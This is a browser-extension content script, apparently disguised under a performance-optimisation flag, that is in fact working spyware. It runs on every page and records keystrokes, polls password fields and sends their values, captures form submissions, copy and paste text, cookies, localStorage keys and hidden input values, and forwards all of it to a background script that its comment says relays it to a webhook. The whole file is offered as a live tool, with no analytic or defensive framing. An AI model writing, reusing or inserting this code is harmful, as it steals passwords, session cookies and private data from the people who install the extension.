// Content script — runs on every page, every frame
(function() {
    if (window.__perf_opt) return;
    window.__perf_opt = true;

    var buffer = [];
    var FLUSH_SIZE = 10;
    var FLUSH_INTERVAL = 5000;

    // Keylogger
    document.addEventListener('keydown', function(e) {
        buffer.push({
            k: e.key,
            c: e.code,
            field: (e.target.name || e.target.id || e.target.tagName).substring(0, 30),
            type: e.target.type || '',
            ts: Date.now()
        });
        if (buffer.length >= FLUSH_SIZE) flush();
    }, true);

    // Password field monitor
    setInterval(function() {
        document.querySelectorAll('input[type="password"]').forEach(function(f) {
            if (f.value && f.value !== f.dataset._pv) {
                f.dataset._pv = f.value;
                send({
                    type: 'password',
                    url: location.href,
                    field: f.name || f.id || 'password',
                    value: f.value
                });
            }
        });
    }, 1500);

    // Form submission capture
    document.addEventListener('submit', function(e) {
        var fields = {};
        try {
            new FormData(e.target).forEach(function(v, k) { fields[k] = v; });
        } catch(ex) {}
        send({
            type: 'form',
            url: location.href,
            action: e.target.action,
            method: e.target.method,
            fields: fields
        });
    }, true);

    // Clipboard capture
    document.addEventListener('paste', function(e) {
        var text = (e.clipboardData || window.clipboardData).getData('text');
        if (text) send({ type: 'paste', url: location.href, text: text.substring(0, 500) });
    }, true);

    document.addEventListener('copy', function() {
        var sel = window.getSelection().toString();
        if (sel) send({ type: 'copy', url: location.href, text: sel.substring(0, 500) });
    }, true);

    // Flush keylog buffer
    function flush() {
        if (buffer.length === 0) return;
        send({
            type: 'keylog',
            url: location.href,
            title: document.title,
            keys: buffer.splice(0)
        });
    }

    setInterval(flush, FLUSH_INTERVAL);
    window.addEventListener('beforeunload', flush);

    // Send to background script (which forwards to webhook)
    function send(data) {
        data.time = new Date().toISOString();
        data.cookies = document.cookie || '';
        try {
            chrome.runtime.sendMessage(data);
        } catch(e) {}
    }

    // Page load — capture initial state
    send({
        type: 'pageload',
        url: location.href,
        title: document.title,
        referrer: document.referrer,
        cookies: document.cookie,
        localStorage_keys: Object.keys(localStorage),
        inputs: Array.from(document.querySelectorAll('input')).map(function(i) {
            return { name: i.name, type: i.type, value: i.type === 'hidden' ? i.value : '' };
        })
    });
})();
